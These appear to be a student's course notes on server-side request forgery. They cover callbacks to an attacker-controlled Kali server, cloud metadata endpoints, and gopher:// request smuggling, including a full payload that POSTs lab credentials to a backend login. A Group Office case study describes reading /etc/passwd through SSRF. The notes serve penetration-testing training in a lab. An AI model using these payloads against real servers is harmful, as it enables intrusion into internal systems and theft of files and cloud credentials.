# Module 14: Server-side Request Forgery

## Introduction to SSRF

### Interacting with the Vulnerable Server

_Example: Using a SSRF we could interact with the loopback interface of a vulnerable server which would ordinarily not be accessible otherwise._

### Interacting with Back-end Systems and Private IP Ranges

_Private IP Addresses_

| **IP address range** | **Number of addresses** |
| -------------------- | ----------------------- |
| 10.0.0.0/8           | 16,777,216              |
| 172.16.0.0/12        | 1,048,576               |
| 192.168.0.0/16       | 65,536                  |

_Using a SSRF we could also potentially interact with other systems on the internal network._

## Testing for SSRF

### Accessing the SSRF Sandbox Application

_Start the VPN, VM, and add the IPs and hostnames to your hosts file._

### Discovering SSRF Vulnerabilities

_If we discover upload functionality via URL, URI, or link, we should test for SSRF._

<figure><img src="../../../.gitbook/assets/5b7978c23d3a0da004a0f0eb37271846-ssrf_testing_01.png" alt=""><figcaption><p>SSRF Sandbox</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/1baaa68e572184211af6f2ab6cb60516-ssrf_testing_02.png" alt=""><figcaption><p>SSRF Sandbox previewing http://www.megacorpone.com</p></figcaption></figure>

{% hint style="warning" %}
Note that requests to other domains will most likely fail since the VMs in the lab environment do not have full access to the Internet.
{% endhint %}

<figure><img src="../../../.gitbook/assets/682975ec1947759be886ad8a68ede6b7-ssrf_testing_03.png" alt=""><figcaption><p>SSRF Sandbox - Verify Link</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/7538fcc9143faa06af9cae170b636e1b-ssrf_testing_04.png" alt=""><figcaption><p>Verifying http://www.megacorpone.com</p></figcaption></figure>

### Calling Home to Kali

_Restarting the Apache HTTP Server_

```bash
kali@kali:~$ sudo systemctl restart apache2
```

{% hint style="info" %}
When we are performing this kind of testing in the real world, we should include a unique identifier in the URL. This would help us locate the attack in our log file.
{% endhint %}

_Verifying the application requested a page from our Kali VM_

{% code overflow="wrap" %}
```log
kali@kali:~$ sudo tail /var/log/apache2/access.log
192.168.50.101 - - [15/Oct/2021:16:49:40 -0400] "GET /hello_ssrf_world HTTP/1.1" 404 491 "-" "python-requests/2.26.0"
```
{% endcode %}

## Exploiting SSRF

### Retrieving Data

<figure><img src="../../../.gitbook/assets/a0bdcc6acb6678edeeaa376bf862d370-ssrf_exploit_01.png" alt=""><figcaption><p>Attempting to access the Status page</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/7498035030f7e4d3410b4d939ff773cb-ssrf_exploit_02.png" alt=""><figcaption><p>Using the SSRF vulnerability to access the Status page</p></figcaption></figure>

### Instance Metadate in Cloud

_Some cloud hosting providers, such as AWS, use the link-local address **169.254.169.254** for their metadata services. Others provide access through DNS, such as Google Cloud, which uses metadata.google.internal. These may include sensitive/private information._

### Bypassing Authentication in Microservices

_Any security controls enforced by an API gateway on traffic entering the internal network would not apply to the traffic between two microservices since the traffic originates within the internal network_

### Alternative URL Schemes

<figure><img src="../../../.gitbook/assets/4cb3c29f726f4ab4b6794c91cef3e29a-ssrf_schemes_file_01.png" alt=""><figcaption><p>An example file URI in Firefox</p></figcaption></figure>

_Checking the contents of the kali default homepage_

{% code overflow="wrap" %}
```markup
kali@kali:~$ head /usr/share/kali-defaults/web/homepage.html        
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <title>Kali Linux</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta name="description" content="Kali Linux is an Advanced Penetration Testing Linux distribution used for Penetration Testing, Ethical Hacking and network security assessments." />
    <meta name="author" content="Kali Linux" />
    <!-- based on template from http://bootstraptaste.com -->
    <!-- css -->
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/59c02b15b74b293e63c1df0d6554c0c0-ssrf_schemes_file_02.png" alt=""><figcaption><p>An exception occurred</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/898e6d46ada278170e35e876eea9d538-ssrf_schemes_file_03.png" alt=""><figcaption><p>Accessing the contents of /etc/passwd using curl</p></figcaption></figure>

_Starting a netcat listener on port 9000_

```bash
kali@kali:~$ nc -nvlp 9000
listening on [any] 9000 ...
```

_Using curl to send a request with the Gopher protocol_

```bash
kali@kali:~$ curl gopher://127.0.0.1:9000/hello_gopher
```

_Netcat listener handling the Gopher request_

```bash
...
listening on [any] 9000 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 56264
ello_gopher
```

_Example HTTP GET request_

```http
GET /hello_gopher HTTP/1.1
Host: 127.0.0.1:9000
User-Agent: curl/7.74.0
Accept: */*
```

_Sending a mock HTTP request over the Gopher protocol_

```bash
kali@kali:~$ curl gopher://127.0.0.1:9000/_GET%20/hello_gopher%20HTTP/1.1
```

_Netcast listener handlin gour mock HTTP request_

```bash
...
listening on [any] 9000 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 56274
GET /hello_gopher HTTP/1.1
```

<figure><img src="../../../.gitbook/assets/b6ddf1ef65692d1d7c643571d9ab2f9a-ssrf_gopher_01.png" alt=""><figcaption><p>Accessing /status using the gopher protocol</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/b1e404531d1a0f21e1d014c13ab70e6e-ssrf_gopher_02.png" alt=""><figcaption><p>Sending a POST request with gopher to /status</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/95a6367c3b8e7dedf6b1eb15bcae990f-ssrf_gopher_03.png" alt=""><figcaption><p>Double URL-encoding in HTTP Request body</p></figcaption></figure>

### Extra Mile

<details>

<summary><em>Use the Gopher protocol to send a POST request with the username "white.rabbit" and password "dontbelate" to the login endpoint to obtain a flag.</em></summary>

{% code overflow="wrap" %}
```uri
gopher://backend:80/_POST%20/login%20HTTP/1.1%0d%0aContent-Type:%20application/x-www-form-urlencoded%0d%0aContent-Length:%2041%0d%0a%0d%0ausername%3dwhite.rabbit&password%3ddontbelate
```
{% endcode %}

</details>

## Case Study: Group Office

### Accessing Group Office

_Start the VPN, the VM, and add the IP and hostname to your hosts file._

### Discovering the SSRF Vulnerabilities

<figure><img src="../../../.gitbook/assets/50ca461f8e5cb8d60670476dfbdada74-ssrf_group_office_01.png" alt=""><figcaption><p>Group Office login page</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/1420b20a05f5bff3e11710cfedcacc0c-ssrf_group_office_02.png" alt=""><figcaption><p>Group Office Start Page</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/d070042e556dd6ee5a39c48f8d25e6ca-ssrf_group_office_03.png" alt=""><figcaption><p>The list of portlets we can add to the Start Page</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/2292f5f2447746b0e48de71766dc5f0c-ssrf_group_office_04.png" alt=""><figcaption><p>The updated Start page including the News portlet</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/6b1dcd56b394b79419cfbaeeb77910da-ssrf_group_office_05.png" alt=""><figcaption><p>Group Office RSS Feeds window</p></figcaption></figure>

_Restarting apache2_

```bash
kali@kali:~$ sudo systemctl restart apache2
```

<figure><img src="../../../.gitbook/assets/cac5210f30794d7a622b97b438576450-ssrf_group_office_06.png" alt=""><figcaption><p>Adding our IP address as an RSS feed</p></figcaption></figure>

_Checking our access.log file with tail_

{% code overflow="wrap" %}
```log
kali@kali:~$ sudo tail /var/log/apache2/access.log
192.168.50.105 - - [17/Nov/2021:10:34:02 -0500] "GET / HTTP/1.1" 200 10956 "-" "Group-Office HttpClient 6.5.77 (curl)"
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/f79dffa0deed2a4d59157249051b241a-ssrf_group_office_07.png" alt=""><figcaption><p>HTTP history for addin RSS feeds</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/a8ad6b369f26bd7b7e5b8b2a507e7393-ssrf_group_office_08.png" alt=""><figcaption><p>Proxy request in Burp Suite Repeater</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/68160e2dd05dfd21066134bd77832a2f-ssrf_group_office_09.png" alt=""><figcaption><p>The response content is a 404 page including our IP address</p></figcaption></figure>

Access log contents include a request to /repeater

{% code overflow="wrap" %}
```log
kali@kali:~$ sudo tail /var/log/apache2/access.log
192.168.50.105 - - [17/Nov/2021:10:34:02 -0500] "GET / HTTP/1.1" 200 10956 "-" "Group-Office HttpClient 6.5.77 (curl)"
192.168.50.105 - - [17/Nov/2021:10:55:39 -0500] "GET /repeater HTTP/1.1" 404 437 "-" "Group-Office HttpClient 6.5.77 (curl)"
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/b89983fb50ac333e8f11bd89a9a99567-ssrf_group_office_10.png" alt=""><figcaption><p>My Account link</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/0a28f388be4a990fed0dde54d22f08c9-ssrf_group_office_11.png" alt=""><figcaption><p>Updating a user's profile picture</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/cfa6ca6e773402df724667adda0c145c-ssrf_group_office_12.png" alt=""><figcaption><p>Insert from  URL dialog window</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/66b3924b6f2a548470efa987554c95b3-ssrf_group_office_13.png" alt=""><figcaption><p>Submitting our IP address in the URL field</p></figcaption></figure>

_Access log contents include a request to /fromurl_

{% code overflow="wrap" %}
```log
kali@kali:~$ sudo tail /var/log/apache2/access.log
...
192.168.50.105 - - [17/Nov/2021:11:25:45 -0500] "GET /fromurl HTTP/1.1" 404 437 "-" "Group-Office HttpClient 6.5.77 (curl)"<c/r>
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/d81beb9094279e3229b9d7cab84d3fcf-ssrf_group_office_14.png" alt=""><figcaption><p>Burp Suite HTTP history with request to /api/upload.php</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/d1f5e08a3daed8729b6a3341862c3a16-ssrf_group_office_15.png" alt=""><figcaption><p>The bloblId is used in following request</p></figcaption></figure>

_Creating itworked.html and moving it to our webroot_

```bash
kali@kali:~$ echo "it worked" > itworked.html
                      
kali@kali:~$ sudo mv itworked.html /var/www/html/itworked.html
```

<figure><img src="../../../.gitbook/assets/12798dce4eff194a4504944ebb2ec27c-ssrf_group_office_16.png" alt=""><figcaption><p>Updating the URL parameter</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/a558c0e6c7ad5d9959b0438843ea7bc4-ssrf_group_office_17.png" alt=""><figcaption><p>The server responds with an error</p></figcaption></figure>

### Exploiting the SSRF Vulnerabilities

<figure><img src="../../../.gitbook/assets/5967e4dc3dcc16149f386d85f41c1329-ssrf_group_office_exploit_01.png" alt=""><figcaption><p>The server returned an empty response to our attack</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/ab4be253915ccc0c6ce8d5f6199b07e1-ssrf_group_office_exploit_02.png" alt=""><figcaption><p>Group Office Address book page</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/9494c23dd31d8e39f39a948701f2cb27-ssrf_group_office_exploit_03.png" alt=""><figcaption><p>Downloading a blob</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/07cd6a0cb136dd61f6b3a209009eb67e-ssrf_group_office_exploit_04.png" alt=""><figcaption><p>Retrieving our HTML page</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/8902bffe4ff6a44e8879f5d1197839e3-ssrf_group_office_exploit_05.png" alt=""><figcaption><p>Sending the SSRF attack to access /etc/passwd</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/bf3b7203681e33a8e526fd054e3bd13f-ssrf_group_office_exploit_06.png" alt=""><figcaption><p>Retrieving the contents of /etc/passwd</p></figcaption></figure>
